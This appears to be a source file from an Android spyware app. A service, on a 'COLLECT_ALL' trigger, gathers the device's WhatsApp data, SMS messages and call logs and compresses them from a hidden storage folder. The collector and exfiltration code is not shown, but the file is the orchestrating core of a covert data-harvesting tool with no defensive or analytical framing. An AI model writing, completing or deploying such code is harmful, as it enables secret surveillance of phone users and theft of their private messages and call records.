package com.alzahra.services;

import android.app.IntentService;
import android.content.Intent;

import com.alzahra.collectors.CallLogCollector;
import com.alzahra.collectors.SMSCollector;
import com.alzahra.collectors.WhatsAppCollector;
import com.alzahra.storage.HiddenStorageManager;
import com.alzahra.storage.ZipCompressor;

public class CollectorService extends IntentService {

    public CollectorService() {
        super("CollectorService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null && "COLLECT_ALL".equals(intent.getAction())) {
            performCollection();
        }
    }

    private void performCollection() {
        WhatsAppCollector.collect(this);
        SMSCollector.collect(this);
        CallLogCollector.collect(this);
        
        ZipCompressor.compressData(HiddenStorageManager.getHiddenFolder(this));
    }
}
